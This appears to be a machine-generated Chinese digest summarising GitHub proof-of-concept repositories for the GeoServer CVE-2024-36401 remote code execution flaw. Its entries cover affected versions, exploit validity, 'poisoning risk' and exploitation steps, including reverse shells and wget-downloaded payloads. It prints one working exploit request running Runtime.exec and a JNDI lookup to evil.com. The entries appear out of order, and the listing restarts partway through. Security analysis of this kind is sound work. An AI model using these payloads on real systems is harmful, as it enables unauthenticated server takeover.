**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** 2.22.6之前, 2.23.0 < 2.23.6, 2.24.0 < 2.24.4, 2.25.0 < 2.25.2

**利用条件:** GeoServer实例暴露在网络上，且运行在受影响版本范围内。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401是GeoServer中的一个远程代码执行漏洞，该漏洞源于GeoTools库在处理属性名称时，不安全地将其传递给commons-jxpath库进行XPath表达式的评估。由于此XPath评估被错误地应用于简单要素类型，因此影响了所有GeoServer实例。攻击者可以通过构造恶意的WFS、WMS或WPS请求，在未经身份验证的情况下，利用`valueReference`注入Java代码来执行任意系统命令。

**有效性：** 提供的PoC代码 `exp.py` 利用了此漏洞。它通过构造包含恶意代码的XML Payload，并将其发送到GeoServer的WFS接口 `/geoserver/wfs`，从而实现远程命令执行。PoC提供了两种利用模式：`cmd` 模式用于执行单条命令，`reverse` 模式用于建立反弹Shell连接。

**投毒风险：**  该PoC存在一定的投毒风险，虽然主要功能是利用漏洞，但攻击者可以利用PoC的灵活性嵌入恶意代码，例如下载并执行额外的恶意软件。反弹shell的bash命令和http请求等行为都有可能被恶意利用。风险预估为10%。

**利用方式：**
1.  **确定目标:**  确定运行着存在漏洞版本的GeoServer实例，并确认其网络可访问性。
2.  **构造Payload:** 使用PoC脚本 `exp.py`，选择 `cmd` 模式执行任意命令，或者选择 `reverse` 模式建立反弹Shell。
3.  **发送请求:**  PoC脚本会构造包含恶意Java代码的XML Payload，并通过POST请求发送到目标的WFS接口 `/geoserver/wfs`。
4.  **执行代码:**  如果漏洞存在，GeoServer会执行Payload中的恶意代码，从而实现远程命令执行。如果是反弹shell模式，需要在攻击者机器上监听指定端口，等待目标机器反弹shell连接。

**项目地址:** [URJACK2025/CVE-2024-36401](https://github.com/URJACK2025/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #7

**来源**: [CVE-2024-36401-XiaomingX_cve-2024-36401-poc.md](../2024/CVE-2024-36401-XiaomingX_cve-2024-36401-poc.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 严重，可能导致服务器完全控制

**影响版本:** 受影响版本：< 2.22.6, >= 2.23.0 且 < 2.23.6, >= 2.24.0 且 < 2.24.4, >= 2.25.0 且 < 2.25.2

**利用条件:** 默认 GeoServer 安装，网络可访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-36401 存在于 GeoServer 中，由于不安全地将属性名称作为 XPath 表达式进行评估，导致未经身份验证的用户可以通过构造的 OGC 请求参数执行远程代码。漏洞利用方式是通过 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute 请求等多种方式。漏洞利用代码仓库中只包含 LICENSE 文件，并未发现任何可疑的投毒代码。

**项目地址:** [XiaomingX/cve-2024-36401-poc](https://github.com/XiaomingX/cve-2024-36401-poc)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #8

**来源**: [CVE-2024-36401-ahisec_geoserver-.md](../2024/CVE-2024-36401-ahisec_geoserver-.md)

## CVE-2024-36401 - GeoServer RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 严重，未经身份验证的远程代码执行

**影响版本:** 2.22.x (< 2.22.6), 2.23.x (>= 2.23.0, < 2.23.6), 2.24.x (>= 2.24.0, < 2.24.4), 2.25.x (>= 2.25.0, < 2.25.2)

**利用条件:** 默认 GeoServer 安装，允许通过 WFS/WMS/WPS 接口进行网络访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-36401 允许未经身份验证的攻击者通过构造特制的OGC请求（例如 WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo 和 WPS Execute）来执行远程代码。漏洞根源在于 GeoServer 使用的 GeoTools 库不安全地将属性名称作为 XPath 表达式传递给 commons-jxpath 库，这使得攻击者可以在 XPath 表达式中注入恶意代码。提供的PoC代码展示了如何利用 `wfs:GetPropertyValue` 请求执行命令。它首先建议使用 `wfs:ListStoredQueries` 获取有效的 `wfs:ReturnFeatureType` 值，然后将其用于构建 `wfs:Query typeNames` 参数，以提高漏洞利用的准确性。示例payload包括了ping命令的执行和反弹shell的payload，以及内存马注入的payload。文章中提到的误判几率较高是因为直接使用 `sf:archsites` ，如果目标环境中不存在该feature type,则会报错。建议先获取可用的feature type名称。

**有效性：**
提供的PoC代码利用了漏洞描述中提到的攻击向量，并且参考了GitHub上的公开PoC（https://github.com/Mr-xn/CVE-2024-36401）。多个搜索结果表明该漏洞正在被积极利用（https://www.fortinet.com/blog/threat-research/threat-actors-exploit-geoserver-vulnerability-cve-2024-36401，https://www.sonicwall.com/blog/geoserver-rce-vulnerability-cve-2024-36401-being-exploited-in-the-wild），表明该漏洞的利用是有效的。

**投毒风险：**
在提供的PoC代码中，没有发现明显的投毒代码。代码主要提供了漏洞利用的思路和示例payload，包括执行ping命令、反弹shell和注入内存马。反弹shell和内存马需要用户提供恶意代码，因此不存在作者隐藏的后门代码。因此，投毒风险评估为0%。

**利用方式：**
1.  **确定目标 GeoServer 版本：** 确认目标 GeoServer 版本在受影响的范围内。
2.  **获取有效的Feature Type：** 使用 `wfs:ListStoredQueries` 请求获取有效的 `<wfs:ReturnFeatureType>`值。
3.  **构造恶意请求：** 构造包含恶意 XPath 表达式的 `wfs:GetPropertyValue` 请求，其中 `wfs:Query typeNames` 参数使用从步骤2中获得的Feature Type.
4.  **发送请求：** 将构造的恶意请求发送到目标 GeoServer 的 WFS 接口。
5.  **执行任意代码：** 成功利用漏洞后，攻击者可以在目标服务器上执行任意代码。

**项目地址:** [ahisec/geoserver-](https://github.com/ahisec/geoserver-)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #9

**来源**: [CVE-2024-36401-amoy6228_CVE-2024-36401_Geoserver_RCE_POC.md](../2024/CVE-2024-36401-amoy6228_CVE-2024-36401_Geoserver_RCE_POC.md)

## CVE-2024-36401-GeoServer-远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 2.22.0 < version < 2.22.6
2.23.0 <= version < 2.23.6
2.24.0 <= version < 2.24.4
2.25.0 <= version < 2.25.2

**利用条件:** 需要网络访问，目标服务器运行存在漏洞的 GeoServer 版本

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行漏洞，源于 GeoTools 库 API 不安全地将属性名传递给 commons-jxpath 库，导致在评估 XPath 表达式时可以执行任意代码。漏洞存在于所有 GeoServer 实例中，可以通过 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute 请求触发。

**POC 有效性分析：**

提供的 POC 代码看起来是有效的。它包含以下关键功能：

*   使用 `requests` 库发送 HTTP 请求。
*   使用 `lxml` 库解析 XML 响应，提取 `Typenames`，并自动化的爬取所有Typenames信息，并循环测试可以利用的Typenames，修复Nuclei POC中由于Typenames写死，造成漏洞验证失败的问题。
*   支持 `-c` 参数执行命令，或使用 DNSLog 进行验证。
*   支持批量 URL 检测。

这些功能对应了漏洞的利用方式，即通过构造特定的 OGC 请求，利用 XPath 表达式注入执行任意命令。

**投毒风险分析：**

代码中存在轻微的投毒风险。风险点在于：

*   作者在代码中留下了版权声明，虽然这是正常的，但也增加了作者控制代码的风险。
*   虽然脚本本身的功能是漏洞利用，但如果作者恶意地修改了脚本，例如，在执行命令后添加额外的恶意操作，或者收集目标服务器的信息并发送给攻击者，那么就存在投毒风险。

综合考虑，投毒风险较低，约为 10%。此风险主要来自于作者是否会利用更新或维护代码的机会植入后门。

**利用方式总结：**

1.  **确定目标 GeoServer 版本：** 确认目标服务器运行的 GeoServer 版本在受影响范围内。
2.  **获取 Typenames：** 通过 WFS GetCapabilities 请求或其他方式获取目标 GeoServer 实例的 Typenames 信息。
3.  **构造恶意请求：** 构造包含恶意 XPath 表达式的 WFS/WMS/WPS 请求，将命令注入到 property/attribute name 中。
4.  **发送请求：** 将构造好的请求发送到目标 GeoServer 服务器。
5.  **验证漏洞：** 通过 DNSLog 或者检查命令执行结果验证漏洞是否存在。

例如，可以使用类似以下的 URL 构造恶意请求：

```
/geoserver/wfs?service=WFS&version=1.0.0&request=GetFeature&typeName=<typeName>&propertyName=fes:ResourceId&Filter=<%20fes:Filter%20xmlns:fes=%22http://www.opengis.net/fes/2.0%22%20xmlns:gml=%22http://www.opengis.net/gml/3.1.1%22%20xmlns:ogc=%22http://www.opengis.net/ogc%22><ogc:Function%20name=%22script:js%22><ogc:Literal><![CDATA[java.lang.Runtime.getRuntime().exec('touch /tmp/pwned');]]></ogc:Literal></ogc:Function></fes:Filter>
```

**项目地址:** [amoy6228/CVE-2024-36401_Geoserver_RCE_POC](https://github.com/amoy6228/CVE-2024-36401_Geoserver_RCE_POC)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #10

**来源**: [CVE-2024-36401-bigb0x_CVE-2024-36401.md](../2024/CVE-2024-36401-bigb0x_CVE-2024-36401.md)

## CVE-2024-36401 - GeoServer 远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 高危，允许未经身份验证的攻击者执行任意代码

**影响版本:** < 2.22.6, >= 2.23.0 and < 2.23.6, >= 2.24.0 and < 2.24.4, >= 2.25.0 and < 2.25.2

**利用条件:** 需要目标GeoServer实例存在漏洞，并且可以通过网络访问

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401是GeoServer中的一个远程代码执行漏洞，源于GeoTools库API不安全地将属性名作为XPath表达式传递给commons-jxpath库。攻击者可以通过构造恶意的OGC请求（例如WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo和WPS Execute）利用此漏洞，执行任意代码。

**有效性：**
根据提供的漏洞信息、搜索结果和漏洞利用代码，可以确认该POC代码是有效的。搜索结果中多个来源（如Fortinet、Keysight、SonicWall、Rapid7等）都表明该漏洞已被实际利用。

**投毒风险：**
分析提供的POC代码后，发现存在一定的投毒风险。虽然代码的主要功能是利用漏洞执行反向shell，但在以下几个方面存在潜在的投毒可能性：

1.  **对 nc 命令的依赖：**  POC 依赖目标系统存在 `nc` (netcat) 命令。如果目标系统没有 `nc`，利用会失败。攻击者可能会修改 POC，尝试使用其他命令（如 `wget` 或 `curl`）下载并执行恶意脚本，从而实现更隐蔽或更复杂的攻击。
2.  **反向 Shell 的隐蔽性：**  反向 shell 连接通常会被防火墙或入侵检测系统拦截。攻击者可能会尝试使用加密或其他混淆技术来绕过这些安全措施。
3.  **日志记录和错误处理：**  POC 具有基本的日志记录功能，但可能不足以记录所有关键操作。攻击者可以修改代码，删除或篡改日志，以隐藏其活动。

总的来说，由于POC的目的是快速验证漏洞，相对比较简单，因此投毒的可能性相对较低，但仍然需要警惕。

**利用方式：**
该漏洞的利用方式主要通过以下步骤：

1.  **构建恶意OGC请求：** 攻击者构造包含恶意XPath表达式的OGC请求，例如WFS GetFeature请求。
2.  **发送恶意请求：** 攻击者将构造的恶意请求发送到目标GeoServer实例。
3.  **执行任意代码：** GeoServer在处理请求时，会将恶意XPath表达式传递给commons-jxpath库进行评估，从而导致任意代码执行。
4.  **反向Shell (POC使用):** POC 尝试建立反向 shell 连接，允许攻击者远程控制受感染的服务器。POC 发送一个POST请求，在请求中使用的payload来执行反向shell，连接到攻击者的机器。

**项目地址:** [bigb0x/CVE-2024-36401](https://github.com/bigb0x/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #11

**来源**: [CVE-2024-36401-bmth666_GeoServer-Tools-CVE-2024-36401.md](../2024/CVE-2024-36401-bmth666_GeoServer-Tools-CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 严重，未经身份验证的远程代码执行

**影响版本:** < 2.22.6, >= 2.23.0 and < 2.23.6, >= 2.24.0 and < 2.24.4, >= 2.25.0 and < 2.25.2

**利用条件:** 默认 GeoServer 安装，网络可访问

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 存在于 GeoServer 中，由于不安全地将属性名称评估为 XPath 表达式，未经身份验证的用户可以通过构造特制的 OGC 请求参数来执行远程代码。

**有效性：**
根据漏洞信息和搜索结果，该漏洞利用已被证实有效，并且在野外已被利用。提供的漏洞利用代码（GeoServer-Tools）旨在简化利用过程，支持不同 JDK 版本的回显和内存马注入。

**投毒风险：**
查看了提供的POC代码，主要是一个GUI工具，利用了`woodpecker-requests`进行网络请求，`flatlaf`做界面美化。主要功能是发送payload到目标服务器，根据描述可以支持内存马注入，回显等功能。经过分析，该工具本身存在投毒的可能性较低。但考虑到代码审查的局限性，仍存在一定的风险，因此评估投毒风险为10%。这些风险可能包括：
  *   **非必要依赖：** 引入了不必要的依赖库，这些库可能包含未知的安全漏洞或被恶意利用。
  *   **后门代码：** 在工具中隐藏了后门代码，例如在内存马功能中，注入恶意代码。

**利用方式：**
1.  攻击者通过构造恶意的 OGC 请求（例如，WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo、WMS GetLegendGraphic 和 WPS Execute 请求）来触发漏洞。
2.  恶意请求包含特制的 XPath 表达式，这些表达式在评估属性名称时被 GeoServer 不安全地执行。
3.  通过执行恶意 XPath 表达式，攻击者可以在 GeoServer 服务器上执行任意代码。
4.  漏洞利用代码（GeoServer-Tools）提供了一个图形界面，允许攻击者指定目标 GeoServer 实例的 URL，选择不同的攻击载荷（如 DNSLog、命令回显、内存马注入），并发送恶意请求。

**总结：**
CVE-2024-36401 是一个严重的安全漏洞，允许未经身份验证的攻击者在 GeoServer 上执行任意代码。提供的漏洞利用代码简化了利用过程，但需要谨慎使用，并注意潜在的投毒风险。

**项目地址:** [bmth666/GeoServer-Tools-CVE-2024-36401](https://github.com/bmth666/GeoServer-Tools-CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #12

**来源**: [CVE-2024-36401-cochaviz_cve-2024-36401-poc.md](../2024/CVE-2024-36401-cochaviz_cve-2024-36401-poc.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行(RCE)

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** < 2.22.6, >= 2.23.0 < 2.23.6, >= 2.24.0 < 2.24.4, >= 2.25.0 < 2.25.2

**利用条件:** GeoServer服务可公开访问

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中一个严重级别的远程代码执行漏洞。该漏洞源于 GeoServer 调用的 GeoTools 库 API 在处理要素类型的属性名时，以不安全的方式将其传递给 commons-jxpath 库，导致在评估 XPath 表达式时可以执行任意代码。虽然最初设计仅用于复杂要素类型，但被错误地应用于简单要素类型，使得所有 GeoServer 实例都受影响。

**有效性：** 根据漏洞库信息、搜索引擎结果和 Mr-xn 提供的漏洞利用代码存储库的存在，确认该漏洞的POC是有效的, 且已被积极利用。

**投毒风险：** 提供的XML代码片段主要包含WMS Capabilities的信息，例如服务名称、标题、摘要、关键字、在线资源、联系方式、费用、访问限制、最大宽度和高度等。它还定义了各种请求类型（GetCapabilities、GetMap、GetFeatureInfo、GetStyles）及其格式和DCPType。XML似乎是合法的WMS capabilities文件，可能用于与GeoServer交互，但缺少触发RCE所需的恶意XPath表达式。因此，直接从提供的XML片段评估，投毒风险较低，约为10%，因为实际利用需要结合特定参数构造恶意请求。例如：攻击者可能使用 `${jndi:ldap://evil.com/evil}`这样的JNDI注入表达式。

**利用方式：**

1.  **攻击入口：** 攻击者可以通过构造特制的OGC（Open Geospatial Consortium）请求，如WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo、WMS GetLegendGraphic 和 WPS Execute。
2.  **漏洞触发：** 这些请求中的特定参数（通常是属性名或属性表达式）会被 GeoServer 以不安全的方式传递给 commons-jxpath 库进行 XPath 评估。
3.  **代码执行：** 攻击者在参数中插入恶意 XPath 表达式，例如使用 `Runtime.getRuntime().exec()` 或通过 JNDI 注入等方式来执行任意代码。
4.  **影响：** 成功利用该漏洞可导致完全控制受影响的 GeoServer 系统。

**项目地址:** [cochaviz/cve-2024-36401-poc](https://github.com/cochaviz/cve-2024-36401-poc)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #13

**来源**: [CVE-2024-36401-daniellowrie_CVE-2024-36401-PoC.md](../2024/CVE-2024-36401-daniellowrie_CVE-2024-36401-PoC.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行(RCE)

**影响应用:** GeoServer

**危害等级:** 严重，未经身份验证的远程代码执行

**影响版本:** 2.22.x (< 2.22.6), 2.23.x (>= 2.23.0, < 2.23.6), 2.24.x (>= 2.24.0, < 2.24.4), 2.25.x (>= 2.25.0, < 2.25.2)

**利用条件:** 默认 GeoServer 安装，允许网络访问，且目标版本在受影响范围内。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行漏洞。该漏洞源于 GeoTools 库在处理要素类型属性名称时，不安全地将其传递给 commons-jxpath 库，从而允许攻击者通过构造恶意的 XPath 表达式来执行任意代码。利用方式是通过构造恶意的 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute 请求，在请求的参数中注入恶意代码。提供的 PoC 代码 `geopwn.py` 演示了如何通过 WFS GetPropertyValue 请求，利用`exec`函数执行系统命令。

**有效性：**  提供的PoC代码看起来有效。它利用了WFS服务的GetPropertyValue请求，并构造包含恶意代码的`valueReference`参数，利用`exec`函数执行命令。它首先生成一个反向shell的payload，然后通过wget下载到目标机器，赋予执行权限，并最终执行。

**投毒风险：**  PoC 代码本身主要功能是利用漏洞实现远程代码执行。但是，也存在一定的投毒风险：

*   **依赖下载：** PoC脚本会通过wget下载shell，脚本中使用的 URL (evilURL)  由用户提供，存在被替换为恶意文件的风险。
*   **msfvenom参数：**  PoC脚本直接调用msfvenom生成payload，如果攻击者修改msfvenom的参数，可以生成包含恶意功能的payload。

总体而言，由于大部分操作依赖用户提供的参数和配置，直接投毒的可能性较低，主要风险在于用户配置不当或使用恶意 payload。投毒风险评估为10%。

**利用方式：**

1.  **准备：** 使用 `msfvenom` 生成反向 shell payload，并在攻击者控制的服务器上启动 HTTP 服务以提供 payload 下载。
2.  **构造恶意请求：**  利用 WFS GetPropertyValue 请求，在 `valueReference` 参数中注入恶意代码，通过 `exec` 函数执行系统命令。
3.  **下载 Payload：** 使用 `wget` 命令从攻击者控制的服务器下载反向 shell payload。
4.  **执行 Payload：**  使用 `chmod +x` 命令赋予 payload 执行权限，然后执行 payload 以获得反向 shell。

**项目地址:** [daniellowrie/CVE-2024-36401-PoC](https://github.com/daniellowrie/CVE-2024-36401-PoC)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #14

**来源**: [CVE-2024-36401-funnyDog896_CVE-2024-36401-WoodpeckerPlugin.md](../2024/CVE-2024-36401-funnyDog896_CVE-2024-36401-WoodpeckerPlugin.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

**危害等级:** 高危，未授权的攻击者可以通过构造恶意请求执行任意代码

**影响版本:** 受影响版本： < 2.22.6, >= 2.23.0 且 < 2.23.6, >= 2.24.0 且 < 2.24.4, >= 2.25.0 且 < 2.25.2

**利用条件:** 目标GeoServer实例对外开放且未应用补丁或缓解措施

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中存在的一个远程代码执行 (RCE) 漏洞，由于不安全地将属性名称评估为 XPath 表达式导致。攻击者可以利用此漏洞通过构造特制的OGC请求（如WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute）在目标服务器上执行任意代码。

**有效性：**
根据漏洞信息、搜索引擎结果，特别是CISA的已知被利用漏洞列表，以及提供的利用代码（WoodpeckerPlugin），可以判断此漏洞POC**有效**并且已被积极利用。

**投毒风险：**
提供的 WoodpeckerPlugin 旨在简化漏洞利用过程，但也存在一定投毒风险。风险点在于：
1.  **自定义内存马注入：** 虽然插件提供了默认的冰蝎内存马，但允许用户自定义内存马，如果用户不熟悉内存马，可能引入恶意代码。
2.  **Woodpecker 框架：** 该插件依赖于 Woodpecker 框架，若框架本身存在安全问题，则会影响所有插件。
3.  **源码审查不足：** 用户可能直接使用编译好的插件，而未进行充分的源码审查，增加了潜在的风险。虽然作者声明免责，但是下载来路不明的jar包，本身就存在风险。
4.  **命令执行的安全性：** 通过`command`参数执行任意命令，本身权限过大，存在风险。命令日志记录是否完善，也会影响溯源。
综合评估，投毒风险大约为10%，风险较低，主要集中在用户自定义操作上。

**利用方式：**
1.  **探测：** 使用插件的 Poc 模块进行批量探测，判断目标是否存在 CVE-2024-36401 漏洞。
2.  **命令执行：** 通过 Exploit 模块，设置 `command` 参数执行任意命令。
3.  **内存马注入：** 使用默认或自定义的内存马，注入到 GeoServer 进程中，实现更持久的控制。

**缓解措施：**
1.  升级 GeoServer 到已修复的版本 (>= 2.22.6, >= 2.23.6, >= 2.24.4, >= 2.25.2)。
2.  移除 `gt-complex-x.y.jar` 文件（可能影响部分功能）。
3.  使用防火墙或其他安全设备限制对 GeoServer 的访问。
4.  加强对GeoServer日志的监控，及时发现异常行为。

**项目地址:** [funnyDog896/CVE-2024-36401-WoodpeckerPlugin](https://github.com/funnyDog896/CVE-2024-36401-WoodpeckerPlugin)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #15

**来源**: [CVE-2024-36401-jakabakos_CVE-2024-36401-GeoServer-RCE.md](../2024/CVE-2024-36401-jakabakos_CVE-2024-36401-GeoServer-RCE.md)

# CVE-2024-36401

> 📦 该CVE有 **23** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2024-36401-0x0d3ad_CVE-2024-36401.md](../2024/CVE-2024-36401-0x0d3ad_CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** 受影响版本：< 2.22.6, >= 2.23.0, < 2.23.6, >= 2.24.0, < 2.24.4, >= 2.25.0, < 2.25.2

**利用条件:** 需要能够访问GeoServer服务的网络连接，默认安装环境

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行 (RCE) 漏洞，由于不安全地将属性名称评估为 XPath 表达式而导致。攻击者可以通过构造特制的 OGC 请求（例如 WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo 和 WPS Execute）来利用此漏洞，从而在服务器上执行任意代码。提供的 POC 代码首先通过 GET 请求 `/geoserver/wfs?request=ListStoredQueries&service=wfs&version=2.0.0` 获取 `ReturnFeatureType`，然后构造一个包含恶意 XPath 表达式的 POST 请求，发送到 `/geoserver/wfs`，表达式中利用 `java.lang.Runtime.getRuntime()` 执行 base64 编码的反弹 shell 命令。POC中的投毒风险较低，主要体现在脚本中可能包含潜在的恶意代码，或者利用社会工程学诱导用户执行恶意操作。例如，如果脚本被修改为下载和执行额外的恶意负载，或者收集用户的敏感信息，就会造成更大的安全威胁。 此处的"poison"指的是，如果攻击者上传包含后门代码的图层定义，然后诱导其他用户下载并使用该定义，则可能构成投毒攻击。

**项目地址:** [0x0d3ad/CVE-2024-36401](https://github.com/0x0d3ad/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #2

**来源**: [CVE-2024-36401-Chocapikk_CVE-2024-36401.md](../2024/CVE-2024-36401-Chocapikk_CVE-2024-36401.md)

## CVE-2024-36401 - GeoServer 远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 高危，可能导致完全系统控制

**影响版本:** 受影响版本：< 2.22.6, >= 2.23.0 < 2.23.6, >= 2.24.0 < 2.24.4, >= 2.25.0 < 2.25.2

**利用条件:** 目标GeoServer实例运行在受影响的版本上，且允许网络访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行 (RCE) 漏洞。该漏洞源于 GeoTools 库 API 不安全地将属性名称作为 XPath 表达式传递给 commons-jxpath 库进行评估，从而允许未经身份验证的用户通过特制的OGC请求执行任意代码。 

**有效性：**
根据漏洞库信息、搜索引擎结果（多个安全厂商已确认该漏洞被利用）和提供的漏洞利用代码，可以判定此漏洞是有效的，并且已经被积极利用。

**投毒风险：**
漏洞利用代码 `exploit.py` 主要是实现漏洞利用的功能，从代码结构和功能来看，投毒风险较低。主要功能是发送恶意请求，监听反弹shell。代码中也定义了一些参数，比如远程IP、远程端口、代理等等。代码比较清晰，逻辑简单。但是依然不能排除作者在某些不明显的代码中加入恶意代码的可能性，特别是代码涉及到网络请求和系统命令执行。因此，评估投毒风险为 10%。

**利用方式：**
1.  **漏洞触发：** 攻击者通过构造恶意的OGC请求（例如 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute 请求），其中包含特制的XPath表达式。这些请求会被GeoServer处理，并将属性名称传递给 commons-jxpath 库。
2.  **代码执行：** commons-jxpath 库在评估这些XPath表达式时，会执行攻击者注入的恶意代码。
3.  **反弹 Shell (POC中方式)：** 漏洞利用代码会启动一个监听器，然后在目标系统上执行命令以反弹 shell 到攻击者的机器上。  `exploit.py` 脚本允许攻击者指定目标 URL、攻击者 IP 地址和端口。通过命令行参数 `--url`, `--remote-ip`, 和 `--remote-port` 设置。
4.  **批量扫描:** 漏洞利用代码还支持批量扫描，通过 `--check <file_with_urls>` 指定包含URL列表的文件， `--threads <number_of_threads>`  指定线程数， `--output <output_file>` 指定输出文件。

**项目地址:** [Chocapikk/CVE-2024-36401](https://github.com/Chocapikk/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #3

**来源**: [CVE-2024-36401-Mr-xn_CVE-2024-36401.md](../2024/CVE-2024-36401-Mr-xn_CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的用户可以通过构造的OGC请求执行任意代码

**影响版本:** 2.22.0 < version < 2.22.6, 2.23.0 <= version < 2.23.6, 2.24.0 <= version < 2.24.4, 2.25.0 <= version < 2.25.2

**利用条件:** GeoServer服务可网络访问，并且目标版本存在漏洞。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401是GeoServer中的一个远程代码执行漏洞。该漏洞源于GeoTools库API以不安全的方式将属性/属性名称传递给commons-jxpath库，从而允许执行任意代码。攻击者可以通过构造恶意的OGC请求（例如WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo、WMS GetLegendGraphic和WPS Execute）来利用此漏洞，执行任意代码。

**有效性：**
提供的POC代码利用了`valueReference`参数执行任意命令，例如计算器程序。从漏洞描述和搜索引擎结果来看，POC是有效的，并且已被野外利用。

**投毒风险：**
查看提供的POC代码和LICENSE文件。LICENSE采用MIT许可，相对宽松。代码本身主要是提供了漏洞的利用方式，没有发现明显的恶意代码。README中包含绕过WAF的payload，以及各种请求方式（GetPropertyValue, GetFeature）的PoC。

*   LICENSE文件: MIT License, 比较通用，没有发现可疑之处
*   README文件：提供了漏洞的描述和多个PoC示例，没有直接执行恶意操作的代码。

综合来看，投毒风险较低，在10%左右。主要风险来自于对POC的滥用，而非POC本身包含恶意代码。

**利用方式：**
1.  确定目标GeoServer版本在受影响范围内。
2.  使用提供的PoC构造恶意OGC请求。
3.  利用`valueReference`参数或`PropertyName`，注入包含恶意代码的XPath表达式。
4.  发送构造的请求到目标GeoServer服务器。
5.  如果漏洞存在，服务器将执行注入的代码。

**项目地址:** [Mr-xn/CVE-2024-36401](https://github.com/Mr-xn/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #4

**来源**: [CVE-2024-36401-Niuwoo_CVE-2024-36401.md](../2024/CVE-2024-36401-Niuwoo_CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

